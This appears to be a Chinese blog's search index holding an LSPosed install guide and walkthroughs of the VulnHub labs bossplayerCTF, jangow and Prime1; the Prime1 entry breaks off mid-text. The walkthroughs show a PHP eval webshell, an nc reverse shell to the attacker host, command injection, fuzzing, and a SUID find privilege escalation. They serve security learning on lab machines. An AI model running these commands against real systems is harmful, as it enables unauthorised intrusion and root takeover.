<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>高版本安卓XPosed框架安装指南</title>
      <link href="/install-xposed-for-android/"/>
      <url>/install-xposed-for-android/</url>
      
        <content type="html"><![CDATA[<p>XPosed框架是一款可以在不修改APK的情况下影响程序运行（修改系统）的框架服务，基于它可以制作出许多功能强大的模块，且在功能不冲突的情况下同时运作。 </p><p>目前Xposed框架已停止更新，它支持Android 6.0-8.1，但它针对android 8.0和8.1的仅为Beta版本。</p><p>如果想要在高版本安卓系统下使用XPosed，可以考虑以下两种方案：</p><ol><li>Edxposed</li><li>LSPosed（推荐！！！）</li></ol><p>Lsposed 是 Edxposed 的一个新的分支，Lsposed 与Edxposed 相互兼容，却比 Edxposed 更加简洁、易用和高效，是现如今饱受诟病的 Edxposed 的极佳替代品。</p><p>本文主要介绍LSPosed的安装方式</p><h1 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h1><ul><li>安卓版本：8～11</li><li>Magisk v21+、Magisk Manager</li></ul><h1 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h1><p>1、下载 <a href="https://github.com/LSPosed/LSPosed/releases/latest">LSPosed模块</a></p><p>Riru版需要安装Riru，Zygisk版可以直接在Magisk中打开Zygisk</p><p>这里我下的Zygisk版</p><p>2、打开Zygisk</p><p>Magisk – 右上角【设置】 –  打开Zygisk</p><p><img src="/img/image-20230630130046825.png" alt="image-20230630130046825"></p><p>3、安装LSPosed模块</p><p>Magisk – 模块 – 从本地安装</p><p>选择第一步下载的LSPosed模块，等待安装完成之后，模块下面就会多出一个</p><p><img src="/img/image-20230630130422037.png" alt="image-20230630130422037"></p><p>4、安装LSPosed</p><p>前面第一步下载的那玩意是Magisk里面的LSPosed模块，现在是一个app</p><p>直接在应用商店下就行，我是在Play Store直接下的，没有的话就去网上找找资源</p><p><img src="/img/image-20230630130637206.png" alt="image-20230630130637206"></p><p>5、激活LSPosed</p><p>打开LSPosed app，会显示已经激活</p><p>要是没激活，试试重启大法！</p><p><img src="/img/image-20230630130756179.png" alt="image-20230630130756179"></p><p><strong>参考</strong></p><p><a href="https://magiskcn.com/lsposed-install">LSPosed 安装教程（LSP框架安装教程） - Magisk中文网</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 - 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】bossplayerCTF攻略</title>
      <link href="/bossplayer-ctf-walkthrough/"/>
      <url>/bossplayer-ctf-walkthrough/</url>
      
        <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>1、下载虚拟机<br><a href="https://www.vulnhub.com/entry/bossplayersctf-1%2C375/">虚拟机地址</a><br>2、打开虚拟机<br>直接双击ova文件，选择打开方式为VirtualBox即可<br>3、开机，到这个页面就行了<br><img src="/img/image-20221129200026339.png" alt="image-20221129200026339"></p><p>现在可以开始渗透了~</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="靶机IP"><a href="#靶机IP" class="headerlink" title="靶机IP"></a>靶机IP</h2><p>用nmap扫描整个C段，拿到靶机IP（我的网段是192.168.56.x）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="number">192.168</span>.<span class="number">56.1</span>/<span class="number">24</span>        </span><br></pre></td></tr></table></figure><p><img src="/img/image-20221129200047187.png" alt="image-20221129200047187"><br>扫出三个IP（192.168.56.1是我物理机)<br><strong>Kali：192.168.56.101靶机：192.168.56.102</strong></p><h2 id="访问Web"><a href="#访问Web" class="headerlink" title="访问Web"></a>访问Web</h2><p>靶机开放了80端口，我们访问一下<br><img src="/img/image-20221129200106819.png" alt="image-20221129200106819"><br>就是些靶机作者写的靶机介绍，没啥提示性的信息<br>然后我查看了前端源码，没发现什么。页面上也没有可以点的链接<br>所以接下来尝试目录扫描</p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dirb http://<span class="number">192.168</span>.<span class="number">56.102</span>/</span><br><span class="line"></span><br><span class="line"><span class="literal">----</span> Scanning URL: http://<span class="number">192.168</span>.<span class="number">56.102</span>/ <span class="literal">----</span></span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">56.102</span>/index.html (CODE:<span class="number">200</span>|SIZE:<span class="number">575</span>)                                                                                                   </span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">56.102</span>/robots.txt (CODE:<span class="number">200</span>|SIZE:<span class="number">53</span>)                                                                                                    </span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">56.102</span>/server<span class="literal">-status</span> (CODE:<span class="number">403</span>|SIZE:<span class="number">302</span>)</span><br></pre></td></tr></table></figure><p>逐一访问上述三个地址</p><ul><li>index.html：就是上面那个刚打开的网页</li><li>robots.txt：出现了下面的文本</li></ul><blockquote><p>super secret password - bG9sIHRyeSBoYXJkZXIgYnJvCg&#x3D;&#x3D;</p></blockquote><ul><li>server-status：提示403Forbidden</li></ul><p>所以这一步的关键就在于<code>robots.txt</code>了，接下来我们对拿到的字符进行base64解码（一看第一感觉是base64）</p><blockquote><p>lol try harder bro</p></blockquote><p>被作者嘲笑了。。。<br>找啊找，这靶机作者真的阴啊！在首页源码下面写了一行注释，因为代码只有12行，却把提示信息写到121行，差点就放过去了！拿到一串字符串</p><blockquote><p>WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK</p></blockquote><p>一眼看不知道是啥加密或者编码，我就先试了base64，解出来个这个</p><blockquote><p>ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K</p></blockquote><p>这一看还是编码，而且没有乱码，长度也明显缩短了，所以这很可能是套娃base64，所以接着解密，直到解出来为止</p><blockquote><p>d29ya2luZ2lucHJvZ3Jlc3MucGhwCg&#x3D;&#x3D;</p></blockquote><p>这里以及看出来了，很明显的base64编码特征，再解密：</p><blockquote><p>workinginprogress.php</p></blockquote><p>我们得到了一个php，拼接访问一下</p><h2 id="workinginprogress-php"><a href="#workinginprogress-php" class="headerlink" title="workinginprogress.php"></a>workinginprogress.php</h2><p><img src="/img/image-20221129200131253.png" alt="image-20221129200131253"><br>看这个样子，应该是要Fuzz参数，看他写的Test ping command，感觉可以命令执行，所以写了个命令去Fuzz</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz <span class="literal">-w</span> /usr/share/wfuzz/wordlist/general/common.txt http://<span class="number">192.168</span>.<span class="number">56.102</span>/workinginprogress.php?FUZZ=whoami</span><br></pre></td></tr></table></figure><p>发现<code>cmd</code>这个参数和其他的不一样<br><img src="/img/image-20221129200148707.png" alt="image-20221129200148707"></p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>浏览器访问一下，有东西，直接RCE（怎么感觉初级基本都这样，直接RCE，这是我打的第二个初级vulnhub靶机，第一个是jangow，那个的RCE比这个还直接）<br><img src="/img/image-20221129200202831.png" alt="image-20221129200202831"><br>我一般喜欢一句话木马和反弹shell双管齐下。一句话木马连上之后，可视化的传文件看文件啥的方便很多，反弹shell到msf，后续使用msf的模块比较方便。<br>这里记录一下路径，方便连webshell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span>/var/www/html</span><br><span class="line"><span class="built_in">echo</span><span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;shell&#x27;]);?&gt;&quot;</span> &gt; shell.php</span><br></pre></td></tr></table></figure><p>用蚁剑发现连不上，ls一看，根本就没写进去，尝试新建文件，ls之后发现也没有新建成功，那就只能试试</p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kali监听4130端口</span></span><br><span class="line">nc <span class="literal">-lvvp</span> <span class="number">4130</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹shell</span></span><br><span class="line">workinginprogress.php?cmd=nc <span class="number">192.168</span>.<span class="number">56.101</span> <span class="number">4130</span> <span class="literal">-e</span>/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用交互式命令行</span></span><br><span class="line">python <span class="literal">-c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; uname <span class="literal">-a</span></span><br><span class="line">Linux bossplayers <span class="number">4.19</span>.<span class="number">0</span><span class="literal">-6-amd64</span> <span class="comment">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux</span></span><br><span class="line"></span><br><span class="line">&gt; searchsploit debian <span class="number">4.19</span></span><br><span class="line">Exploits: No Results</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>可以看到，内核提权g了</p><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>之前总结的提权：<a href="https://www.yuque.com/jen413/neiwang/manzoaybnusi9tvo">提权方式</a><br>里面有写到suid提权，这是第一次suid提权实战！<br><strong>① 查找具有suid权限的命令</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/bin/<span class="built_in">mount</span></span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/grep</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/find</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/lib/dbus<span class="literal">-1</span>.<span class="number">0</span>/dbus<span class="literal">-daemon-launch-helper</span></span><br><span class="line">/usr/lib/openssh/ssh<span class="literal">-keysign</span></span><br><span class="line">/usr/lib/eject/dmcrypt<span class="literal">-get-device</span></span><br></pre></td></tr></table></figure><p>② 这里我们选在 find 提权</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . <span class="literal">-exec</span> /bin/bash <span class="literal">-p</span> \;</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221129200221596.png" alt="image-20221129200221596"><br>可以看到提权成功了</p><h1 id="拿flag"><a href="#拿flag" class="headerlink" title="拿flag"></a>拿flag</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1、切换到root目录下</span></span><br><span class="line">cd /root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2、查看目录下文件</span></span><br><span class="line">ls</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3、查看root.txt</span></span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure><p>root.txt的内容</p><blockquote><p>Y29uZ3JhdHVsYXRpb25zCg&#x3D;&#x3D;<br>解密之后：congratulations</p></blockquote><p>Done！！！完成啦！</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】jangow1.0.1攻略</title>
      <link href="/jangow-1.0.1-walkthrough/"/>
      <url>/jangow-1.0.1-walkthrough/</url>
      
        <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><ul><li><a href="https://www.vulnhub.com/entry/jangow-101,754/">下载靶机</a></li><li>导入虚拟机（<strong>！！！推荐VirtualBox导入</strong>）</li><li>开机</li><li>得到ip</li></ul><h1 id="【issue】开机没有IP"><a href="#【issue】开机没有IP" class="headerlink" title="【issue】开机没有IP"></a>【issue】开机没有IP</h1><p>正常在开机的时候，<code>REDE</code>后面就会有IP，但是我这里没有显示。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>如果你跟我一样，不想下载VirtualBox而使用的是VMWare导入靶机，这里<strong>推荐用VirtualBox</strong>，我下了导入VB，直接解决问题，建议还是下一个哈，Vulnhub里面很多靶机都是ova的，用VB打开会更好。<br>如果你还是不想下，那这里给出我找的教程（比上面复杂，反正我是跟着弄了好一会没成功就放弃了）</p><ul><li><a href="https://www.yuque.com/summerdon/cpubfz/ux121k">Vulnhub靶机检测不到IP-语雀</a></li><li><a href="https://blog.csdn.net/qq_41918771/article/details/103636890">Vulnhub靶机检测不到IP地址_Vicl1fe的博客-CSDN博客</a></li></ul><h1 id="【issue】VM和VB互通问题"><a href="#【issue】VM和VB互通问题" class="headerlink" title="【issue】VM和VB互通问题"></a>【issue】VM和VB互通问题</h1><p>如果你按照上面的解决方案，解决了VMWare导入虚拟机没有IP的问题，那你可以直接忽略这一步，直接开始。<br>此issue针对靶机在VirtualBox，而Kali依旧在VMWare中。这种情况下，由于VM和VB的虚拟网卡不在同一网段，也就是说Kali和靶机之间是不通的。解决方法参考以下博客</p><ul><li><a href="https://blog.csdn.net/qq_43342566/article/details/102679837">如何在vmware上访问virtualbox的虚拟机</a></li></ul><h1 id="拿到IP"><a href="#拿到IP" class="headerlink" title="拿到IP"></a>拿到IP</h1><p>一开机，直接就显示了<br><img src="/img/image-20221129185113854.png" alt="image-20221129185113854"><br>这里我用了两台攻击机：VMWare里面的Kali以及我的本机win10（哪个方便用哪个)</p><ul><li>靶机：192.168.56.118</li><li>Kali：192.168.56.</li><li>win10：192.168.56.1</li></ul><h1 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sCTV 192.168.56.118 &gt; jangow.txt</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221129190507571.png" alt="image-20221129190507571"><br>扫出了一个21端口和80端口</p><h1 id="访问Web服务"><a href="#访问Web服务" class="headerlink" title="访问Web服务"></a>访问Web服务</h1><ul><li>用HTTP访问上面扫出的80端口</li></ul><p><img src="/img/image-20221129185311777.png" alt="image-20221129185311777"></p><ul><li>进入<code>site</code></li></ul><p><img src="/img/image-20221129185325813.png" alt="image-20221129185325813"><br>随便看了看网页的功能点</p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><ul><li>点击<code>Buscar</code>，直接跳出个空白页面，参数也没有</li></ul><p><img src="/img/image-20221129185339955.png" alt="image-20221129185339955"></p><ul><li>输入个<code>whoami</code>，好家伙，直接RCE了</li></ul><p><img src="/img/image-20221129185357889.png" alt="image-20221129185357889"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><ul><li>直接写入一句话木马</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;&#x27; &gt;&gt; getshell.php</span><br></pre></td></tr></table></figure><ul><li>用蚁剑连上webshell</li><li>蚁剑打开一个虚拟终端，查看系统版本</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><ul><li>searchsploit找提权脚本，上传到靶机</li></ul><p><img src="/img/image-20221129185413327.png" alt="image-20221129185413327"></p><ul><li>编译，给权限，执行</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc 45010.c -o 45010</span><br><span class="line">chmod 777 45010</span><br><span class="line">./45010</span><br></pre></td></tr></table></figure><p>一顿操作之后，虚拟终端一点反应都没有<br><img src="/img/image-20221129185429675.png" alt="image-20221129185429675"><br>于是上网看看大家的操作<br>用反弹shell，和上面一样的步骤，最后提权成功了<br><img src="/img/image-20221129185446656.png" alt="image-20221129185446656"><br>这可能就是蚁剑那个虚拟终端的问题了，至此，我们已经拿到靶机的root权限了</p><h1 id="拿flag"><a href="#拿flag" class="headerlink" title="拿flag"></a>拿flag</h1><p>vulnhub里面的靶机，最后的flag基本在<code>/root</code>目录下，切过去看看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现一个proof.txt，打开看看</span></span><br><span class="line">cat proof.txt</span><br></pre></td></tr></table></figure><p>ok!成功拿到flag<br><img src="/img/image-20221129185459966.png" alt="image-20221129185459966"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>整体流程比较简单，80页面直接就给了个RCE真的骚<br>过程中还是遇到不少问题，比如</p><ul><li>反弹shell有很多种方式，到底用哪种？这是我不会的地方</li><li>蚁剑的虚拟终端，执行命令会出莫名其妙的问题</li><li>还有反弹shell那块，其实只有443端口是可以出的，其他的都会失败</li></ul><p>感觉那个443出网端口，可能作者并不想我们来反弹shell？</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】Prime1攻略</title>
      <link href="/prime-1-walkthrough/"/>
      <url>/prime-1-walkthrough/</url>
      
        <content type="html"><![CDATA[<h1 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h1><p><a href="https://www.vulnhub.com/entry/prime-1,358/">Prime: 1 ~ VulnHub</a></p><h1 id="找靶机IP"><a href="#找靶机IP" class="headerlink" title="找靶机IP"></a>找靶机IP</h1><h2 id="通过Guest确定IP"><a href="#通过Guest确定IP" class="headerlink" title="通过Guest确定IP"></a>通过Guest确定IP</h2><p>最下面，有个Guest用户可以登录进去</p><p><img src="/img/image-20221105143451128.png" alt="image-20221105143451128"></p><p>右键，Open Terminal打开终端窗口</p><p><img src="/img/image-20221103140616028.png" alt="image-20221103140616028"></p><p>直接执行ifconfig，哎~这IP不就拿到了吗？</p><p><img src="/img/image-20221103140855419.png" alt="image-20221103140855419"></p><h2 id="通过扫描确定IP"><a href="#通过扫描确定IP" class="headerlink" title="通过扫描确定IP"></a>通过扫描确定IP</h2><blockquote><p>这是在B站听无涯老师的课程看到的方法</p><p>不登陆也能找到IP，不过我还是觉得，既然有上面那个口子可以达到目的，就没有必要搞得这么麻烦，这里仅仅作为拓展思维</p></blockquote><p><strong>用Nmap扫描C段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.120.1/24</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221103141649097.png" alt="image-20221103141649097"></p><p>可以看到，同网段扫到了四个机子，一般*.1*是自己的物理机，太小太大的都不考虑，就剩128和145了，而128是我Kali的IP，所以剩下的145就是靶机的IP了。</p><p>要是觉得上面的方法靠猜测不妥，凭什么要排除太大和太小的IP啊是吧？这里给出另外一种方法。</p><p>刚刚扫一遍，得到4个存活的IP，这时候把靶机给关了，再扫描一遍C段，应该只有三个了，第二次消失的那一个，就是靶机的IP了。</p><p>那找到IP之后，我们要登录这个系统，有什么办法可以找到密码呢？</p><h1 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h1><p>拿到IP之后，可以继续扫描，这个IP开放了哪些端口，都运行着什么服务，也许就能找到突破口呢。</p><p>继续<strong>用Nmap扫全端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-65535 192.168.120.145</span><br></pre></td></tr></table></figure><blockquote><p>这里通过-p参数指定全端口，不指定的话，只会扫描常用端口</p></blockquote><p><img src="/img/image-20221103143407496.png" alt="image-20221103143407496"></p><p>扫到2个端口，22和80，对应的服务，也写出来了</p><blockquote><p>如果扫出来的端口比较陌生，不知道运行着什么服务，可以百度查询</p><p>这里给出一份<a href="https://nsrc.org/workshops/2009/summer/presentations/day3/common-ports.pdf">常用的端口对应的服务</a></p></blockquote><p>22端口是SSH服务，无非就是用Xshell去连接，没啥突破口。</p><p>80端口开放的是HTTP服务，也就是有Web服务啊！！！那不开整？</p><h1 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h1><p>用浏览器打开上面开放的80端口</p><p><strong>访问网址</strong>：IP:port，我这里就是192.168.120.145:80（其实直接输入ip就可以访问了，应为HTTP协议默认就是80端口）</p><p><img src="/img/image-20221103144324733.png" alt="image-20221103144324733"></p><p>嗯？？这什么情况？？WTF？？？就一张图片？？？玩呢？？</p><p>冷静冷静哈！思考下，遇到就一张图片，有什么思路可以进行下去？</p><ul><li>CMS指纹识别</li><li>Ctrl+U查看前端源码</li><li>目录扫描</li></ul><p>思路列出来了，一个个尝试吧</p><p>CMS指纹识别，壮烈牺牲</p><p><img src="/img/image-20221103144853909.png" alt="image-20221103144853909"></p><p>emmm源码就。。。算了吧</p><p><img src="/img/image-20221103145005398.png" alt="image-20221103145005398"></p><p>那就只有<strong>目录扫描</strong>了</p><p>问题是怎么扫呢？用啥工具呢？</p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>工具</p><ul><li>dirb</li><li>御剑</li><li>webscan</li><li>gobuster</li><li>dirsearch</li><li>BurpSuite</li><li>………（工具很多）</li></ul><p>我打开dirb就是一顿扫（kali自带dirb）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.120.145</span><br></pre></td></tr></table></figure><p>啊嘞？还有工具连-u都不要加的？不管，看结果</p><p><img src="/img/image-20221103160653117.png" alt="image-20221103160653117"></p><p>扫出了一个WordPress，一看就知道，这是个个人博客。</p><p>打开看看，果然！有没有发现这个victor有点似曾相识？？</p><p><img src="/img/image-20221103160539432.png" alt="image-20221103160539432"></p><p>嘚，白高兴一场，啥也没有发现。</p><p>接下来又看了看扫出来的其他目录，全是WordPress的大概看了下，这条路肝不下去了。</p><p>只能想想有没有其他办法。密码有没有可能存在一个文件里？首先想到的就是txt，接着我又用dirb对txt后缀的来了一顿扫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.120.145 -X .txt</span><br></pre></td></tr></table></figure><p>欸？？？这是啥？<code>secret.txt</code>？？？赶紧打开看看</p><p><img src="/img/image-20221103161740535.png" alt="image-20221103161740535"></p><p>果然有东西啊！！（Prime1：看你太菜了给你点提示吧）</p><p><img src="/img/image-20221103161920266.png" alt="image-20221103161920266"></p><p>整段翻译如下</p><blockquote><p>小伙子有点东西啊！</p><p>但还是菜了点哟！给你点提示：</p><p><strong>对你发现的每一页php做一些Fuzz，如果Fuzz到了正确的参数，然后照着下面的步骤做</strong></p><p><strong>查看<code>location.txt</code>，你就知道下一步该怎么走了。</strong></p><p>如果你还是菜的不行，来<a href="https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web">我们网站</a>学习一下基本工具的使用</p></blockquote><p>我不管，我才不要等下再用这个提示，我就是要现在就访问<code>location.txt</code>，不然我不甘心</p><p><img src="/img/image-20221103162840784.png" alt="image-20221103162840784"></p><p>甘心了，，，对不起打扰了！</p><h2 id="Fuzz参数"><a href="#Fuzz参数" class="headerlink" title="Fuzz参数"></a>Fuzz参数</h2><p>既然上面提到php，那就先扫一下有哪些php，再针对每个php做Fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.120.145 -X .php</span><br></pre></td></tr></table></figure><p>就扫出来这俩</p><p><img src="/img/image-20221103163102067.png" alt="image-20221103163102067"></p><p><strong>激动人心的Fuzz</strong></p><p>问题来了，Fuzz是个啥？不懂的来看看<a href="https://baike.baidu.com/item/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/2848962?fr=aladdin">度娘的解释</a></p><p>看懂了么？我唬你呢！看了比没看还模糊了是吧哈哈哈</p><p>我这里用我自己的浅显理解来解释一下Fuzz</p><blockquote><p>Fuzz即<strong>模糊测试</strong></p><p>就是瞎鸡儿乱猜的意思</p><p>用上面的例子来说，要你Fuzz参数，那参数是个啥样子？get请求下就是<a href="http://192.168.120.145/index.php?%E5%8F%82%E6%95%B0=xxx">http://192.168.120.145/index.php?参数=xxx</a></p><p>至于参数是啥，我不知道啊，那我就只能乱猜，万一瞎猫碰上死耗子，给我猜对了呢？</p><p>Fuzz就是这样，不看技术，全看运气，谁也不知道到底能不能猜对</p></blockquote><p>工具随便哈，很多工具都可以做Fuzz（BP就可以）</p><p>我这里选择直接用kali里面自带的工具<code>wfuzz</code>和自带的字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.120.145/index.php?FUZZ</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221103170429320.png" alt="image-20221103170429320"></p><p>这里解释下这几列的含义</p><ul><li>ID：就id，没啥别的意思</li><li>Response：HTTP请求返回的状态码</li><li>Lines：返回包的行数</li><li>Word：单词个数</li><li>Chars：字符个数</li><li>Payload：Fuzz的参数</li></ul><p>上面字典返回了900多条数据，那怎么找那些可能是正确的参数呢？思路是与大部分不同的一般就有蹊跷，因为大部分参数是错的，那正确的势必返回的就不一样。</p><p>Burp爆破的话，直接点一下排序就看出来了，这个破工具还要用命令行重新执行命令来排序，我真的会谢！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先看看参数，看有啥可以用的</span></span><br><span class="line">wfuzz -h</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用参数过滤</span></span><br><span class="line">--hc# 过滤掉某个响应状态</span><br><span class="line">--hl# 过滤掉响应为x行的</span><br><span class="line">--hw# 过滤掉响应为x个单词的</span><br><span class="line">--hh# 过滤掉响应为x个字符的</span><br></pre></td></tr></table></figure><p>我这里随便选个过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -hl 7 http://192.168.120.145/index.php?FUZZ</span><br></pre></td></tr></table></figure><p>结果是：糟糕！裤衩子都过滤没了</p><p><img src="/img/image-20221103172027133.png" alt="image-20221103172027133"></p><p>那就只能换个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -hw 12 http://192.168.120.145/index.php?FUZZ</span><br></pre></td></tr></table></figure><h2 id="得到index-php的参数"><a href="#得到index-php的参数" class="headerlink" title="得到index.php的参数"></a>得到index.php的参数</h2><p>有东西啊！</p><p><img src="/img/image-20221103172145627.png" alt="image-20221103172145627"></p><p>还记得上面<code>secret.txt</code>里面的提示吗？记不记得有个<code>location.txt</code>？</p><p>还有扫出来的两个php文件：<code>image.php</code>和<code>index.php</code></p><p>现在用这个Fuzz出来的参数试试吧！</p><p><code>image.php</code>没变化</p><p><img src="/img/image-20221103183545155.png" alt="image-20221103183545155"></p><p><code>index.php</code>出现了点不一样的东西，多了些文字</p><p><img src="/img/image-20221103172359891.png" 